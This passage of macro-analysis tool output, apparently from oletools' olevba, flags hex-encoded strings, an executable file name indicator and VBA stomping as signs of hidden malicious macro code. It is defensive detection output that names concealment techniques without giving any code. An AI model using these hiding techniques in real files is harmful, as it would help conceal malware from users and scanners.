|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

